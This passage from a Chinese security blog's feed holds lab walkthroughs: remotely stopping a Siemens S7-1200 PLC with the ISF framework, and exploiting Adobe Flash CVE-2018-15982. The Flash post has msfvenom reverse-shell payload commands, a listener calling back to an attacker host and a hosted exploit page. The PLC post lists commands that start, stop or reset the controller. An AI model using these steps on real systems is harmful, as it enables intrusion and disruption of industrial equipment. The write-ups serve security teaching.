<p>可以看到服务器弹出了计算器，证明漏洞利用成功!</p>
<h2 id="流量分析">流量分析</h2>
<p>通过对EXP脚本执行过程中，使用Wireshark抓取对应数据流量，来看服务器通信过程<br>
<img src="https://hi-kk.github.io//post-images/1563938361402.png" alt=""><br>
<img src="https://hi-kk.github.io//post-images/1563938373889.png" alt=""></p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[工控安全：S7-1200 PLC远程启停攻击实验]]></title>
        <id>https://hi-kk.github.io//post/gong-kong-an-quan-s7-1200-plc-yuan-cheng-qi-ting-gong-ji-shi-yan</id>
        <link href="https://hi-kk.github.io//post/gong-kong-an-quan-s7-1200-plc-yuan-cheng-qi-ting-gong-ji-shi-yan">
        </link>
        <updated>2018-12-29T02:20:08.000Z</updated>
        <content type="html"><![CDATA[<!--more-->
<h2 id="工具及运行环境">工具及运行环境</h2>
<pre><code class="language-bash">root@kali:~# git clone https://github.com/dark-lbp/isf/
root@kali:~# cd isf/
root@kali:~/isf# python isf.py 
root@kali:~/isf# pip install -r requirements.txt
</code></pre>
<p>安装好所需python模块，运行isf.py无报错<br>
<img src="https://hi-kk.github.io//post-images/1563938824684.png" alt=""></p>
<h2 id="网络设置与plc连接">网络设置与PLC连接</h2>
<p>本次实验所用的PLC设备如下，设备型号为<code>SIMATIC S7-1200</code><br>
<img src="https://hi-kk.github.io//post-images/1563938844104.png" alt=""></p>
<p>将设备接通电源后，此时PLC 指示灯<code>RUN/STOP</code>点亮 绿灯<br>
<img src="https://hi-kk.github.io//post-images/1563938863112.png" alt=""></p>
<p>此时使用网线将PLC与主机相连，配置主机网卡IP地址<br>
<img src="https://hi-kk.github.io//post-images/1563938884154.png" alt=""></p>
<p>此时我们还不知道PLC设定的IP地址，所以需要对网段进行扫描<br>
<img src="https://hi-kk.github.io//post-images/1563938898774.png" alt=""></p>
<p>可以看到：使用nmap扫描出的设备除了本机IP就是<code>PLC</code>设备的IP了，其对应的MAC地址也与设备上的标识一致</p>
<h2 id="远程攻击演示">远程攻击演示</h2>
<p>这里我们用的到的攻击模块是<br>
<code>exploits/plcs/siemens/s7_1200_plc_control</code><br>
<img src="https://hi-kk.github.io//post-images/1563938919118.png" alt=""></p>
<p><code>show options查看该模块的配置信息</code><br>
<code>target: 攻击PLC目标IP地址</code><br>
<code>port: 攻击PLC目标端口（默认是102端口）</code><br>
<code>command：攻击指令（0-启动PLC、1-停止PLC、2-重置PLC、3-重置PLC和IP）</code><br>
<img src="https://hi-kk.github.io//post-images/1563938934709.png" alt=""></p>
<p>设置好后，输入run指令 开始远程攻击<code>PLC</code><br>
<img src="https://hi-kk.github.io//post-images/1563938954082.png" alt=""></p>
<p>此时<code>PLC</code>指示灯 <code>RUN/STOP</code> 变成 黄灯，说明PLC设备已经停止运行，远程攻击成功！</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[漏洞实验：CVE-2018-15982-Adobe Flash Player远程代码执行]]></title>
        <id>https://hi-kk.github.io//post/lou-dong-shi-yan-cve-2018-15982-adobe-flash-player-yuan-cheng-dai-ma-zhi-xing</id>
        <link href="https://hi-kk.github.io//post/lou-dong-shi-yan-cve-2018-15982-adobe-flash-player-yuan-cheng-dai-ma-zhi-xing">
        </link>
        <updated>2018-12-26T01:11:13.000Z</updated>
        <content type="html"><![CDATA[<!--more-->
<h2 id="漏洞简介">漏洞简介</h2>
<table>
<thead>
<tr>
<th><strong>漏洞名称</strong></th>
<th>Adobe Flash Player远程代码执行漏洞</th>
</tr>
</thead>
<tbody>
<tr>
<td><strong>威胁类型</strong></td>
<td>远程代码执行</td>
</tr>
<tr>
<td><strong>威胁等级</strong></td>
<td>高</td>
</tr>
<tr>
<td><strong>漏洞ID</strong></td>
<td>CVE-2018-15982</td>
</tr>
<tr>
<td><strong>利用场景</strong></td>
<td>攻击者通过网页下载、电子邮件、即时通讯等渠道向受害者发送恶意构造的Office文件诱使其打开处理，可能触发漏洞在用户系统上执行任意指令获取控制。</td>
</tr>
<tr>
<td><strong>受影响系统及应用版本</strong></td>
<td>Adobe Flash Player（31.0.0.153及更早的版本）</td>
</tr>
<tr>
<td><strong>不受影响影响系统及应用版本</strong></td>
<td>Adobe Flash Player 32.0.0.101（修复后的最新版本）</td>
</tr>
<tr>
<td><strong>修复及升级地址</strong></td>
<td>https://get.adobe.com/flashplayer/</td>
</tr>
</tbody>
</table>
<h2 id="生成msf后门">生成msf后门</h2>
<pre><code class="language-bash">root@kali:~# msfvenom -p windows/meterpreter/reverse_tcp LPORT=5555 LHOST=192.168.177.148 -f raw &gt;86.bin
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 341 bytes

root@kali:~# msfvenom -p windows/meterpreter/reverse_tcp LPORT=5555 LHOST=192.168.177.148 -f raw &gt;64.bin
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 341 bytes
</code></pre>
<p><img src="https://hi-kk.github.io//post-images/1563970336343.png" alt=""></p>
<h2 id="生成exploit">生成exploit</h2>
<p>将msf生成的两个文件86.bin和64.bin放入脚本所在目录下，执行脚本，生成exploit</p>
<pre><code class="language-bash">root@kali:~/CVE-2018-15982_EXP-master# python CVE_2018_15982.py  -i 86.bin -I 64.bin

[*] Done ! output file --&gt; exploit.swf
[*] Done ! output file --&gt; index.html
root@kali:~/CVE-2018-15982_EXP-master#
</code></pre>
<p><img src="https://hi-kk.github.io//post-images/1563970354206.png" alt=""></p>
<h2 id="开启本地http服务">开启本地HTTP服务</h2>
<p>利用python自带服务，在脚本当前目录开启HTTP服务</p>
<pre><code class="language-bash">root@kali:~/CVE-2018-15982_EXP-master# python -m SimpleHTTPServer 8080
</code></pre>
<p><img src="https://hi-kk.github.io//post-images/1563970377161.png" alt=""></p>
<h2 id="开启msf反弹监听">开启MSF反弹监听</h2>
<pre><code class="language-bash">msf &gt; use exploit/multi/handler 
msf exploit(multi/handler) &gt; set payload windows/meterpreter/reverse_tcp
payload =&gt; windows/meterpreter/reverse_tcp
msf exploit(multi/handler) &gt; set LPORT 5555
LPORT =&gt; 5555
msf exploit(multi/handler) &gt; set LHOST 192.168.177.148
LHOST =&gt; 192.168.177.148
msf exploit(multi/handler) &gt; run
</code></pre>
<p><img src="https://hi-kk.github.io//post-images/1563970388609.png" alt=""></p>
<h2 id="反弹shell">反弹shell</h2>
<p>模拟受害者访问HTTP服务，触发漏洞，反弹shell<br>
<img src="https://hi-kk.github.io//post-images/1563970402748.png" alt=""><br>
也许访问后IE会崩溃，未响应<br>
<img src="https://hi-kk.github.io//post-images/1563970415353.png" alt=""><br>
但此时已经成功利用漏洞，反弹shell到msf上了<br>
<img src="https://hi-kk.github.io//post-images/1563970426386.png" alt=""><br>
注意：当浏览器访问的标签页关闭了，反弹的shell也会断开连接<br>
<img src="https://hi-kk.github.io//post-images/1563970440508.png" alt=""></p>
]]></content>
    </entry>
</feed>